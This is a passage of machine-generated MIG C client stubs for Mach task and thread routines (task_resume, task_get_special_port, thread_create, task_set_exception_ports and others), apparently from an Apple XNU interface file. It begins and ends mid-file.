#endif /* !defined(__MIG_check__Reply__task_resume_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_resume */
mig_external kern_return_t task_resume
(
	task_read_t target_task
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_resume_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_resume_t__defined */

	__DeclareSendRpc(3408, "task_resume")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_task;
	InP->Head.msgh_id = 3408;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3408, "task_resume")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3408, "task_resume")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_resume_t__defined)
	check_result = __MIG_check__Reply__task_resume_t((__Reply__task_resume_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_resume_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_get_special_port_t__defined)
#define __MIG_check__Reply__task_get_special_port_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_get_special_port_t(__Reply__task_get_special_port_t *Out0P)
{

	typedef __Reply__task_get_special_port_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3509) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->special_port.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->special_port.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__task_get_special_port_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_get_special_port */
mig_external kern_return_t task_get_special_port
(
	task_inspect_t task,
	int which_port,
	mach_port_t *special_port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int which_port;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_get_special_port_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_get_special_port_t__defined */

	__DeclareSendRpc(3409, "task_get_special_port")

	InP->NDR = NDR_record;

	InP->which_port = which_port;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3409;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3409, "task_get_special_port")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3409, "task_get_special_port")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_get_special_port_t__defined)
	check_result = __MIG_check__Reply__task_get_special_port_t((__Reply__task_get_special_port_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_get_special_port_t__defined) */

	*special_port = Out0P->special_port.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_special_port_t__defined)
#define __MIG_check__Reply__task_set_special_port_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_special_port_t(__Reply__task_set_special_port_t *Out0P)
{

	typedef __Reply__task_set_special_port_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3510) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_special_port_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_special_port */
mig_external kern_return_t task_set_special_port
(
	task_t task,
	int which_port,
	mach_port_t special_port
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int which_port;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_set_special_port_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_special_port_t__defined */

	__DeclareSendRpc(3410, "task_set_special_port")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t special_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->special_port = special_portTemplate;
	InP->special_port.name = special_port;
#else	/* UseStaticTemplates */
	InP->special_port.name = special_port;
	InP->special_port.disposition = 19;
	InP->special_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->which_port = which_port;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3410;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3410, "task_set_special_port")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3410, "task_set_special_port")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_special_port_t__defined)
	check_result = __MIG_check__Reply__task_set_special_port_t((__Reply__task_set_special_port_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_special_port_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__thread_create_t__defined)
#define __MIG_check__Reply__thread_create_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_create_t(__Reply__thread_create_t *Out0P)
{

	typedef __Reply__thread_create_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3511) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->child_act.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->child_act.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_create_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_create */
mig_external kern_return_t thread_create
(
	task_t parent_task,
	thread_act_t *child_act
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t child_act;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t child_act;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_create_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_create_t__defined */

	__DeclareSendRpc(3411, "thread_create")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = parent_task;
	InP->Head.msgh_id = 3411;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3411, "thread_create")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3411, "thread_create")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_create_t__defined)
	check_result = __MIG_check__Reply__thread_create_t((__Reply__thread_create_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_create_t__defined) */

	*child_act = Out0P->child_act.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__thread_create_running_t__defined)
#define __MIG_check__Reply__thread_create_running_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_create_running_t(__Reply__thread_create_running_t *Out0P)
{

	typedef __Reply__thread_create_running_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 3512) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->child_act.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->child_act.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_create_running_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_create_running */
mig_external kern_return_t thread_create_running
(
	task_t parent_task,
	thread_state_flavor_t flavor,
	thread_state_t new_state,
	mach_msg_type_number_t new_stateCnt,
	thread_act_t *child_act
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t new_stateCnt;
		natural_t new_state[1296];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t child_act;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t child_act;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__thread_create_running_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_create_running_t__defined */

	__DeclareSendRpc(3412, "thread_create_running")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (new_stateCnt > 1296) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->new_state, (const char *) new_state, 4 * new_stateCnt);

	InP->new_stateCnt = new_stateCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 5184) + ((4 * new_stateCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = parent_task;
	InP->Head.msgh_id = 3412;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3412, "thread_create_running")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3412, "thread_create_running")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_create_running_t__defined)
	check_result = __MIG_check__Reply__thread_create_running_t((__Reply__thread_create_running_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_create_running_t__defined) */

	*child_act = Out0P->child_act.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_set_exception_ports_t__defined)
#define __MIG_check__Reply__task_set_exception_ports_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_set_exception_ports_t(__Reply__task_set_exception_ports_t *Out0P)
{

	typedef __Reply__task_set_exception_ports_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3513) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__task_set_exception_ports_t__defined) */
#endif /* __MIG_check__Reply__task_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine task_set_exception_ports */
mig_external kern_return_t task_set_exception_ports
(
	task_t task,
	exception_mask_t exception_mask,
	mach_port_t new_port,
	exception_behavior_t behavior,
	thread_state_flavor_t new_flavor
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		exception_mask_t exception_mask;
		exception_behavior_t behavior;
		thread_state_flavor_t new_flavor;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__task_set_exception_ports_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__task_set_exception_ports_t__defined */

	__DeclareSendRpc(3413, "task_set_exception_ports")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t new_portTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->new_port = new_portTemplate;
	InP->new_port.name = new_port;
#else	/* UseStaticTemplates */
	InP->new_port.name = new_port;
	InP->new_port.disposition = 19;
	InP->new_port.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->NDR = NDR_record;

	InP->exception_mask = exception_mask;

	InP->behavior = behavior;

	InP->new_flavor = new_flavor;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = task;
	InP->Head.msgh_id = 3413;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3413, "task_set_exception_ports")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3413, "task_set_exception_ports")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__task_set_exception_ports_t__defined)
	check_result = __MIG_check__Reply__task_set_exception_ports_t((__Reply__task_set_exception_ports_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__task_set_exception_ports_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__task_subsystem__
#if !defined(__MIG_check__Reply__task_get_exception_ports_t__defined)
#define __MIG_check__Reply__task_get_exception_ports_t__defined

mig_internal kern_return_t __MIG_check__Reply__task_get_exception_ports_t(__Reply__task_get_exception_ports_t *Out0P, __Reply__task_get_exception_ports_t **Out1PP, __Reply__task_get_exception_ports_t **Out2PP)
{

	typedef __Reply__task_get_exception_ports_t __Reply __attribute__((unused));
	__Reply *Out1P;
	__Reply *Out2P;
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 3514) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 32 ||
	    msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 384) || msgh_size > (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
